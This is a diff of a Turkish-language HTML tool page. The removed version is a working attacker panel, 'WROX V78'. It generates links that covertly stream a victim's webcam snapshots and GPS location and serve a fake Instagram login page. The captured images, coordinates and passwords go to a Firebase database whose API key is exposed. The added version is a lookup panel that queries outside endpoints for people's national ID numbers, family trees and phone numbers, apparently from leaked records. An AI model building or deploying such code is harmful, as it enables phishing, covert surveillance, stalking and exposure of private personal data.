@@ -2,217 +2,253 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V78 - FREE ACCESS</title>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AzeChecker | API Panel</title>
     <style>
-        :root { --neon: #00f0ff; --bg: #000; --panel: #0a0a0a; --green: #2ecc71; --red: #ff0000; }
-        body { background: var(--bg); color: white; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
+        :root {
+            --primary: #2563eb;
+            --dark: #0f172a;
+            --light: #f1f5f9;
+            --card-bg: #ffffff;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            margin: 0;
+            background-color: var(--light);
+            color: var(--dark);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Hamburger Menü */
+        .sidebar {
+            position: fixed;
+            left: -280px;
+            top: 0;
+            width: 280px;
+            height: 100%;
+            background: var(--dark);
+            color: white;
+            transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 1000;
+            padding-top: 70px;
+            box-shadow: 5px 0 15px rgba(0,0,0,0.2);
+        }
+
+        .sidebar.active { left: 0; }
+
+        .sidebar a {
+            padding: 15px 25px;
+            text-decoration: none;
+            color: #94a3b8;
+            display: block;
+            border-left: 4px solid transparent;
+            transition: 0.3s;
+            font-weight: 500;
+        }
+
+        .sidebar a:hover, .sidebar a.active-link {
+            background: #1e293b;
+            color: white;
+            border-left: 4px solid var(--primary);
+        }
+
+        .menu-btn {
+            position: fixed;
+            top: 15px;
+            left: 15px;
+            z-index: 1001;
+            background: var(--primary);
+            color: white;
+            border: none;
+            width: 45px;
+            height: 45px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Ana İçerik */
+        .main-content {
+            padding: 90px 20px 30px;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .card {
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);
+        }
+
+        h2 { margin-bottom: 20px; font-size: 1.5rem; text-align: center; }
+
+        .input-group { margin-bottom: 15px; }
         
-        /* GİRİŞ & KAYIT */
-        #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: radial-gradient(circle, #05191a 0%, #000 100%); }
-        .auth-box { border: 2px solid var(--neon); padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 350px; background: rgba(10, 10, 10, 0.95); box-shadow: 0 0 20px rgba(0, 240, 255, 0.2); }
-        input { width: 100%; padding: 14px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 8px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 14px; background: transparent; border: 2px solid var(--neon); color: var(--neon); cursor: pointer; font-weight: bold; border-radius: 8px; transition: 0.3s; }
-        button:hover { background: var(--neon); color: #000; }
-        .reg-btn { margin-top: 12px; border-color: #444; color: #777; font-size: 11px; }
+        label { display: block; margin-bottom: 5px; font-size: 14px; font-weight: 600; color: #64748b; }
 
-        /* PANEL YAPISI */
-        #main-panel { display: none; }
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 2px solid var(--neon); background: var(--panel); position: sticky; top: 0; z-index: 100; }
-        .nav-menu { position: fixed; top: 60px; left: -100%; width: 240px; height: 100%; background: var(--panel); border-right: 2px solid var(--neon); transition: 0.4s; z-index: 99; }
-        .nav-menu.active { left: 0; }
-        .nav-menu div { padding: 20px; border-bottom: 1px solid #1a1a1a; cursor: pointer; color: var(--neon); font-size: 13px; font-weight: bold; }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
 
-        /* SEKMELER VE AKIŞ */
-        .tab-content { display: none; padding: 20px; animation: fadeIn 0.5s; }
-        .tab-content.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        input:focus { border-color: var(--primary); }
 
-        .stream-container { border: 2px solid var(--neon); border-radius: 15px; padding: 15px; margin-top: 20px; background: #050505; }
-        .feed-wrapper { display: flex; flex-direction: column; gap: 15px; max-height: 500px; overflow-y: auto; padding-right: 5px; }
-        .feed-item { border: 1px solid #222; border-radius: 12px; padding: 12px; background: #000; font-size: 11px; }
-        .feed-item img { width: 100%; border-radius: 8px; margin-top: 8px; border: 1px solid #333; }
+        .send-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 10px;
+            box-shadow: 0 4px 6px rgba(37, 99, 235, 0.2);
+        }
 
-        .link-box { background: #111; padding: 12px; font-size: 10px; word-break: break-all; margin: 15px 0; border: 1px dashed var(--neon); color: var(--neon); border-radius: 5px; display: none; }
-        
-        /* Kaydırma Çubuğu */
-        .feed-wrapper::-webkit-scrollbar { width: 4px; }
-        .feed-wrapper::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 10px; }
+        /* Sonuç Paneli */
+        #result-container {
+            margin-top: 25px;
+            background: #1e293b;
+            border-radius: 10px;
+            padding: 15px;
+            display: none;
+        }
+
+        #result {
+            color: #10b981;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+            backdrop-filter: blur(2px);
+        }
+        .overlay.active { display: block; }
     </style>
 </head>
 <body>
 
-    <div id="auth-screen">
-        <div class="auth-box">
-            <h1 style="color: var(--neon); font-size: 26px; margin: 0 0 20px 0;">WROX V78</h1>
-            <input type="text" id="email" placeholder="E-posta Adresiniz">
-            <input type="password" id="pass" placeholder="Şifreniz">
-            <button onclick="auth('login')">SİSTEME GİRİŞ YAP</button>
-            <button class="reg-btn" onclick="auth('register')">ÜCRETSİZ KAYIT OL</button>
-        </div>
+    <button class="menu-btn" onclick="toggleMenu()">☰</button>
+    <div class="overlay" onclick="toggleMenu()"></div>
+
+    <div class="sidebar" id="sidebar">
+        <a href="#" onclick="setMode('adsoyad')">👤 Ad Soyad Sorgu</a>
+        <a href="#" onclick="setMode('tc')">🆔 TC Sorgu</a>
+        <a href="#" onclick="setMode('aile')">👨‍👩‍👧‍👦 Aile Sorgu</a>
+        <a href="#" onclick="setMode('sulale')">🌳 Sülale Sorgu</a>
+        <a href="#" onclick="setMode('gsmtc')">📱 GSM -> TC</a>
+        <a href="#" onclick="setMode('tcgsm')">🆔 TC -> GSM</a>
     </div>
 
-    <div id="main-panel">
-        <div class="header">
-            <div onclick="toggleMenu()" style="cursor:pointer; font-size:24px;">☰ WROX <span style="color:#3498db">V78</span></div>
-            <div id="user-tag" style="color: var(--green); font-size: 10px; font-weight: bold;"></div>
-        </div>
+    <div class="main-content">
+        <div class="card">
+            <h2 id="panel-title">Ad Soyad Sorgu</h2>
+            
+            <div id="dynamic-inputs">
+                </div>
 
-        <div id="side-menu" class="nav-menu">
-            <div onclick="showTab('cam-tab')">📸 KAMERA SIZMA (BURST)</div>
-            <div onclick="showTab('loc-tab')">📍 KONUM TAKİP (GPS)</div>
-            <div onclick="showTab('ig-tab')">🔗 INSTAGRAM PHISHING</div>
-        </div>
-
-        <div id="cam-tab" class="tab-content active">
-            <h3>📷 KAMERA ÜNİTESİ</h3>
-            <button onclick="genLink('cam')">KAMERA LİNKİ OLUŞTUR</button>
-            <div id="cam-link" class="link-box"></div>
-            <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:12px;">🔴 CANLI GÖRÜNTÜ AKIŞI:</div>
-                <div id="cam-feed" class="feed-wrapper"></div>
-            </div>
-        </div>
-
-        <div id="loc-tab" class="tab-content">
-            <h3>📍 KONUM TAKİBİ</h3>
-            <button onclick="genLink('loc')">GPS KONUM LİNKİ OLUŞTUR</button>
-            <div id="loc-link" class="link-box"></div>
-            <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:12px;">📌 SON KONUMLAR:</div>
-                <div id="loc-feed" class="feed-wrapper"></div>
-            </div>
-        </div>
-
-        <div id="ig-tab" class="tab-content">
-            <h3>🔑 INSTAGRAM PANEL</h3>
-            <button onclick="genLink('ig')">SAHTE IG LİNKİ OLUŞTUR</button>
-            <div id="ig-link" class="link-box"></div>
-            <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:12px;">👤 DÜŞEN HESAP BİLGİLERİ:</div>
-                <div id="ig-feed" class="feed-wrapper"></div>
+            <button class="send-btn" onclick="sendQuery()">Sorgula</button>
+            
+            <div id="result-container">
+                <div id="result"></div>
             </div>
         </div>
     </div>
 
     <script>
-        // 1. FIREBASE KONFİGÜRASYONU
-        const firebaseConfig = {
-            apiKey: "AIzaSyAKB12tpEblTHYV7niVHc3VvAtv0jl873E",
-            databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
-            projectId: "wrox-premium",
+        let currentMode = 'adsoyad';
+
+        const config = {
+            adsoyad: { title: "Ad Soyad Sorgu", fields: ["Ad", "Soyad", "İl", "İlçe"], url: "https://azechecker.xyz/apiler/adsoyad.php" },
+            tc: { title: "TC Sorgu", fields: ["TC"], url: "https://azechecker.xyz/apiler/tc.php" },
+            aile: { title: "Aile Sorgu", fields: ["TC"], url: "https://azechecker.xyz/apiler/aile.php" },
+            sulale: { title: "Sülale Sorgu", fields: ["TC"], url: "https://azechecker.xyz/apiler/sulale.php" },
+            gsmtc: { title: "GSM'den TC Sorgu", fields: ["GSM"], url: "https://azechecker.xyz/apiler/gsmtc.php" },
+            tcgsm: { title: "TC'den GSM Sorgu", fields: ["TC"], url: "https://azechecker.xyz/apiler/tcgsm.php" }
         };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
 
-        let activeUser = "";
-
-        // 2. GİRİŞ VE ÜCRETSİZ KAYIT MANTIĞI
-        function auth(type) {
-            const emailInput = document.getElementById('email').value.trim();
-            const passInput = document.getElementById('pass').value;
-            const userID = emailInput.split('@')[0].replace(/[^a-zA-Z0-9]/g, "");
-
-            if (!emailInput || !passInput) return alert("Bilgileri doldurun!");
-
-            // Admin Giriş Kontrolü (AFAVAN66 Özel)
-            if (emailInput === "E-POSTA" && passInput === "ŞİFRE") {
-                activeUser = "ADINI YAZ";
-                startApp(true);
-                return;
-            }
-
-            if (type === 'register') {
-                db.ref('users/' + userID).set({ p: passInput, e: emailInput })
-                  .then(() => alert("Ücretsiz kaydınız tamamlandı! Giriş yapabilirsiniz."));
-            } else {
-                db.ref('users/' + userID).once('value').then(s => {
-                    if (s.exists() && s.val().p === passInput) {
-                        activeUser = userID;
-                        startApp(false);
-                    } else { alert("Hatalı e-posta veya şifre!"); }
-                });
-            }
+        function toggleMenu() {
+            document.getElementById('sidebar').classList.toggle('active');
+            document.querySelector('.overlay').classList.toggle('active');
         }
 
-        function startApp(isAdmin) {
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('main-panel').style.display = 'block';
-            document.getElementById('user-tag').innerText = (isAdmin ? "ADMİN: " : "USER: ") + activeUser.toUpperCase();
-            
-            // VERİLERİ DİNLE VE PANELİ GÜNCELLE
-            db.ref('logs/' + activeUser).on('child_added', s => {
-                const val = s.val();
-                let html = `<div class="feed-item"><b>⏱ ${new Date(val.t).toLocaleTimeString()}</b><br>`;
-                
-                if (val.type === 'cam') {
-                    html += `<img src="${val.d}"></div>`;
-                    document.getElementById('cam-feed').insertAdjacentHTML('afterbegin', html);
-                } else if (val.type === 'loc') {
-                    html += `<a href="${val.d}" target="_blank" style="color:#f1c40f; text-decoration:none;">📍 HARİTADA GÖRÜNTÜLE (TIKLA)</a></div>`;
-                    document.getElementById('loc-feed').insertAdjacentHTML('afterbegin', html);
-                } else if (val.type === 'ig') {
-                    html += `<span style="color:var(--green)">Kullanıcı: ${val.u}</span><br><span style="color:var(--red)">Şifre: ${val.p}</span></div>`;
-                    document.getElementById('ig-feed').insertAdjacentHTML('afterbegin', html);
-                }
+        function setMode(mode) {
+            currentMode = mode;
+            const settings = config[mode];
+            document.getElementById('panel-title').innerText = settings.title;
+            const container = document.getElementById('dynamic-inputs');
+            container.innerHTML = '';
+
+            settings.fields.forEach(field => {
+                container.innerHTML += `
+                    <div class="input-group">
+                        <label>${field}</label>
+                        <input type="text" id="input-${field.toLowerCase()}" placeholder="${field} giriniz...">
+                    </div>
+                `;
             });
-        }
 
-        // PANEL YÖNETİMİ
-        function toggleMenu() { document.getElementById('side-menu').classList.toggle('active'); }
-        function showTab(tabId) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.getElementById(tabId).classList.add('active');
+            document.getElementById('result-container').style.display = 'none';
             toggleMenu();
         }
 
-        function genLink(mode) {
-            const link = window.location.href.split('?')[0] + `?ref=${activeUser}&m=${mode}`;
-            const box = document.getElementById(mode + '-link');
-            box.innerText = link; box.style.display = 'block';
-        }
+        async function sendQuery() {
+            const settings = config[currentMode];
+            const resultDiv = document.getElementById('result');
+            const resultContainer = document.getElementById('result-container');
+            
+            // Parametreleri topla
+            let params = new URLSearchParams();
+            settings.fields.forEach(field => {
+                const val = document.getElementById(`input-${field.toLowerCase()}`).value;
+                params.append(field.toLowerCase(), val);
+            });
 
-        // 3. KURBAN MODLARI (LİNK AÇILDIĞINDA ÇALIŞIR)
-        const params = new URLSearchParams(window.location.search);
-        const ref = params.get('ref');
-        const mode = params.get('m');
+            resultContainer.style.display = 'block';
+            resultDiv.innerText = "Sorgulanıyor... Lütfen bekleyin.";
 
-        if (ref && mode) {
-            if (mode === 'ig') {
-                document.body.innerHTML = `
-                <div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:50px; font-family:sans-serif;">
-                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="180">
-                    <input id="iu" placeholder="Kullanıcı adı" style="width:280px; padding:12px; margin-top:35px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px; outline:none;">
-                    <input id="ip" type="password" placeholder="Şifre" style="width:280px; padding:12px; margin-top:10px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px; outline:none;">
-                    <button onclick="sendIG()" style="width:280px; background:#0095f6; color:white; border:none; padding:12px; margin-top:20px; border-radius:4px; font-weight:bold; cursor:pointer;">Giriş Yap</button>
-                    <p style="color:#00376b; font-size:12px; margin-top:30px; font-weight:bold;">Şifreni mi unuttun?</p>
-                </div>`;
-                window.sendIG = () => {
-                    db.ref('logs/'+ref).push({type:'ig', u:document.getElementById('iu').value, p:document.getElementById('ip').value, t:Date.now()});
-                    location.href = "https://instagram.com";
-                };
-            } else if (mode === 'loc') {
-                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#222; display:flex; align-items:center; justify-content:center;">Bağlantı bekleniyor...</div>`;
-                navigator.geolocation.getCurrentPosition(p => {
-                    const url = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    db.ref('logs/'+ref).push({type:'loc', d:url, t:Date.now()});
-                });
-            } else if (mode === 'cam') {
-                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#111; display:flex; align-items:center; justify-content:center;">İşlem devam ediyor...</div>`;
-                navigator.mediaDevices.getUserMedia({video:true}).then(s => {
-                    const v = document.createElement('video'); v.srcObject=s; v.play();
-                    const c = document.createElement('canvas');
-                    setInterval(() => {
-                        c.width=v.videoWidth; c.height=v.videoHeight;
-                        c.getContext('2d').drawImage(v,0,0);
-                        db.ref('logs/'+ref).push({type:'cam', d:c.toDataURL('image/webp', 0.4), t:Date.now()});
-                    }, 4000);
-                });
+            try {
+                const response = await fetch(`${settings.url}?${params.toString()}`);
+                const data = await response.text(); // JSON değilse .text() kullanıyoruz
+                
+                // Eğer API JSON dönüyorsa güzelleştirelim
+                try {
+                    const jsonData = JSON.parse(data);
+                    resultDiv.innerText = JSON.stringify(jsonData, null, 2);
+                } catch {
+                    resultDiv.innerText = data;
+                }
+            } catch (error) {
+                resultDiv.innerText = "Bağlantı Hatası: " + error.message;
             }
         }
+
+        // İlk açılışta Ad Soyad modunu yükle
+        window.onload = () => setMode('adsoyad');
     </script>
 </body>
 </html>
